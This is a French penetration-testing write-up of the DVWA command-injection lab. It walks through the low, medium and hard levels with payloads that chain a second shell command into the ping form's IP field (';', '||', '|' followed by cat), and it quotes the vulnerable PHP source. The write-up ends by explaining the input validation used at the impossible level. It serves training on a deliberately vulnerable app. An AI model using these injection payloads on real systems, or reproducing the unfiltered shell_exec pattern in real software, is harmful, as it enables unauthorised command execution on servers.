# 1. Command Injection

La Command Injection est une vulnérabilité de sécurité où un attaquant peut injecter et exécuter des commandes système dans une application, souvent via une interface utilisateur. Cette vulnérabilité permet à un attaquant d'exécuter des commandes directement sur le serveur ou la machine hôte qui exécute l'application.

Lorsqu'une application prend des données en entrée de l'utilisateur (par exemple via un formulaire web) et les utilise sans validation ou filtre, un attaquant peut insérer une commande système malveillante dans l'entrée. Si l'application passe cette entrée directement à un interpréteur de commande (comme le shell Linux), l'attaquant peut exécuter des commandes non autorisées sur le serveur.

## 1.1 Premier niveau - low

On arrive sur une page avec un service de ping  

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\exec\1.png)  

Puisque c'est du php, on va essayer une simple methode qui consite à utiliser le caractètre `;` pour "sortir" du code php qui permet de ping, puis nous allons saisir la commande que l'on veux 

```
; cat ../exec/source/low.php
```

Ici par exemple nous allons afficher le code source de la page, ce qui nous permettra de visualiser en même temps comment fonctionne le serveur.  

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\exec\2.png)  

Puisque c'est du code php, il faut regarder avec `ctrl + u` pour voir le script php.

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    $html .= "<pre>{$cmd}
```

On tombe sur ceci et on remarque que il n'y a aucun contrôle sur l'input de l'utilisateur. De plus on comprend mieux comment les commandes systemes sont executés. C'est a l'aide de la fonction `shell_exec()` de php.

## 1.2 Deuxieme niveau - medium

Pour ce deuxieme niveau, en essayant avec `;` l'injection ne fonctionne pas. Nous avons donc cherché differents caractères propres à Linux qui aurait peut être échappé au filtre que le dévellopeur à mis en place car on se doute ici que certains caractères ont été blacklisté.  

Après une simple recherche sur Internet, on tombe sur un github `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md` qui nous fournit quelques indications.

```
; (Semicolon): Allows you to execute multiple commands sequentially.
&& (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
|| (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
& (Background): Execute the command in the background, allowing the user to continue using the shell.
| (Pipe): Takes the output of the first command and uses it as the input for the second command.
```

En essayant ces caractères, on en trouve un qui n'est pas blacklisté `||`.  
Cela nos permet d'éxecuter cette commande et par la même occasion lire le code php.

```
|| cat ../exec/source/medium.php
```

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the characters in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    $html .= 
```

Notre théorie initial était correcte. On à effectivement une blacklist qui inclue le `;` et `&&` mais pas le `||`.

## 1.3 Troisième niveau - hard

Pour ce troisieme challenge, on part du principe que l'administrateur a blacklist tous les caractères que l'on a cité avant. On doit donc trouver une autre manière.

Cependant, en essayant plusieurs commande dans l'éventualité ou notre théorie était fausse on tombe sur cette commande qui elle fonctionne

```
|cat ../exec/source/high.php
```

Le script est bien exécuté 
![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\exec\3.png)  

On peux maintenant essayer de comprendre pourquoi :).  
En fait la raison est probablement un oublie ou une faute de frappe puisqu'on voit que le symbole `|` n'est pas blacklisté, c'est le symbole `| ` qui l'est. Cela nous permet donc d'éxecuter notre code.  

## 1.4 Niveau impossible

Voici le code php du niveau impossible :  

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

        // Get input
        $target = $_REQUEST[ 'ip' ];
        $target = stripslashes( $target );

        // Split the IP into 4 octects
        $octet = explode( ".", $target );

        // Check IF each octet is an integer
        if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
                // If all 4 octets are int's put the IP back together.
                $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

                // Determine OS and execute the ping command.
                if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
                        // Windows
                        $cmd = shell_exec( 'ping  ' . $target );
                }
                else {
                        // *nix
                        $cmd = shell_exec( 'ping  -c 4 ' . $target );
                }

                // Feedback for the end user
                $html .= "<pre>{$cmd}</pre>";
        }
        else {
                // Ops. Let the user name theres a mistake
                $html .= '<pre>ERROR: You have entered an invalid IP.</pre>';
        }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

Essayons de comprendre:  
Tout d'abord l'input de l'utilisateur est récupéré via `$_REQUEST['ip']` puis la fonction `stripslashes()` lui est appliqué permettant de retirer dans un premier temps les caractères spéciaux  

Puis l'adresse IP est vérifiée a l'aide de ce bloc de code

```php
$octet = explode( ".", $target );
if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) )
```

Ce dernier va diviser l'IP en 4 parties grâce au séparateur `.` puis chaque octet est validé avec la fonction `is_numeric()` permettant de vérifier si il s'agit bien de chiffres. Finalement le script vérifie aussi la taille avec `size($octet) == 4` pour confirmer que l'adresse comporte exactement 4 partie.